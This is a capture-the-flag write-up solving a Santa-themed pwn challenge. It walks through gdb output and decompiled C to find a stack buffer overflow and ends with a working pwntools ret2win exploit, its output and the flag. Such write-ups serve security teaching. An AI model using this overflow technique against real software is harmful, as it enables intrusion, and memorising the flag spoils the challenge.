
# CTF

What is on your wish list this year? Be sure to tell Santa in great detail. He might have an early present or two in store for you!

`nc ctf.csd.lol 4003`

# Solution

Let's connect using netcat:

```
jstr$ nc ctf.csd.lol 4003
enter your wish:
test
hmm ... I'm not sure I can grant that
maybe try again next year.
[DEBUG] returning to address: 0x7743af6ca1ca
```


Since we have the program locally, we can see the list of functions using `gdb` , so let's run it

```
jstr$ db ./main
GNU gdb (Debian 15.2-1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./main...
(No debugging symbols found in ./main)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  puts@plt
0x00000000004010b0  write@plt
0x00000000004010c0  printf@plt
0x00000000004010d0  read@plt
0x00000000004010e0  fflush@plt
0x00000000004010f0  open@plt
0x0000000000401100  exit@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  win
0x0000000000401397  main
0x000000000040149c  _fini
```

We can also look at the decompiled code using [dogbolt](https://dogbolt.org) (thank you dogbolt for existing) and get the `win` and `main` parts of the code.

```c++
void __noreturn win()
{
  __int64 buf[33]; // [rsp+0h] [rbp-110h] BYREF
  int v1; // [rsp+108h] [rbp-8h]
  int fd; // [rsp+10Ch] [rbp-4h]

  fd = open("flag.txt", 0);
  memset(buf, 0, 256);
  v1 = read(fd, buf, 0x100uLL);
  write(1, buf, v1);
  exit(0);
}
// 4011F6: using guessed type void __noreturn win();

//----- (0000000000401397) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf[12]; // [rsp+0h] [rbp-70h] BYREF
  int v5; // [rsp+60h] [rbp-10h]
  int v6; // [rsp+6Ch] [rbp-4h]
  const void *retaddr; // [rsp+78h] [rbp+8h]

  puts("enter your wish:");
  fflush(_bss_start);
  memset(buf, 0, sizeof(buf));
  v5 = 0;
  v6 = read(0, buf, 0x100uLL);
  *((_BYTE *)buf + v6) = 0;
  puts("hmm ... I'm not sure I can grant that");
  puts("maybe try again next year.");
  printf("[DEBUG] returning to address: %p\n", retaddr);
  fflush(_bss_start);
  return 0;
}

//----- (000000000040149C) ----------------------------------------------------
void term_proc()
{
  ;
}

// nfuncs=34 queued=18 decompiled=18 lumina nreq=0 worse=0 better=0
// ALL OK, 18 function(s) have been successfully decompiled
```

In the `main` function, we can see:
``` c++
__int64 buf[12]; // [rsp+0h] [rbp-70h] BYREF
```

the `buf` has a limit to 12 integers which is 96 bytes (`12 * 8 = 96`).

In the same function, we can see:

``` c++
v6 = read(0, buf, 0x100uLL);
```

this input doesn't limit the size like `buf`, since it allows 256 bytes of data. This means that if we input more than 96 bytes, which the input does allow us to do, we can buffer overflow.

Since we have the information above and we also know that win is located at `0x4011F6` , we can write an exploit. The goal of the exploit would be to replace the return address with this address, so when the `main` function attempts to return, it jumps to `win` instead.


This is the exploit:

```python
from pwn import *
p = remote('ctf.csd.lol', 4003)

offset = 120  

win_address = p64(0x4011f6)

payload = b"A" * offset
payload += win_address

p.sendline(payload)

p.interactive()

```

the exploit overflows the `buf` in the `main` function, which overwrites the return address with the address of the `win`. this triggers the `win` function and it executes the flag.

let's run it:

```
jstr$ python exploit.py
[+] Opening connection to ctf.csd.lol on port 4003: Done
[*] Switching to interactive mode
enter your wish:
hmm ... I'm not sure I can grant that
maybe try again next year.
[DEBUG] returning to address: 0x4011f6
csd{Br0uGH7_t0_YOU_8y_W15H_D0t_CoM}
[*] Got EOF while reading in interactive
```

flag; `csd{Br0uGH7_t0_YOU_8y_W15H_D0t_CoM}`
